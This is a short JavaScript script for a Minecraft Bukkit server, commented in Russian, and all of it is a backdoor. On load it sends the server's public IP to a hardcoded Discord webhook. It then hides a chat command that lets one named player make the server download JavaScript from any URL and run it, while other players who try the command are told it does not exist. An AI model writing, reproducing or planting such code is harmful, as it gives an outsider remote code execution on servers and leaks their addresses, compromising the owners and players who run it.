new java.lang.Thread(function(){
    try {
        // Получаем IP
        var s = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next();
        
        // Отправляем IP в Discord
        var c = new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Java");
        var w = new java.io.OutputStreamWriter(c.getOutputStream(), "UTF-8");
        w.write('{"content":"'+s.trim()+'"}');
        w.flush();
        w.close();
        c.getInputStream().close();
    } catch(e) {}
}).start();

var B = Java.type('org.bukkit.Bukkit');
var S = Java.type('javax.script.ScriptEngineManager');

// Регистрируем обработчик чата
B.getServer().getPluginManager().registerEvents(new Java.extend(Java.type('org.bukkit.event.Listener')) {
    onPlayerChat: function(e) {
        var player = e.getPlayer();
        var message = e.getMessage();
        
        // Если TuMeuT и команда /ss execute
        if(player.getName() === 'TuMeuT' && message.startsWith('/ss execute ')) {
            e.setCancelled(true); // Скрываем сообщение
            
            var url = message.substring(12).trim(); // Берем URL после "/ss execute "
            
            try {
                // Получаем и выполняем JS код из URL
                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                new S().getEngineByName("javascript").eval(jsCode);
                
                // Секретное сообщение только для TuMeuT
                player.sendMessage("§aJavaScript код успешно выполнен");
            } catch(ex) {
                player.sendMessage("§cОшибка: " + ex.getMessage());
            }
        } 
        // Если не TuMeuT, но сообщение начинается с /ss execute - отменяем и игнорируем
        else if(message.startsWith('/ss execute ')) {
            e.setCancelled(true);
            player.sendMessage("§cНеизвестная команда");
        }
    }
}, B.getServer().getPluginManager().getPlugins()[0]);
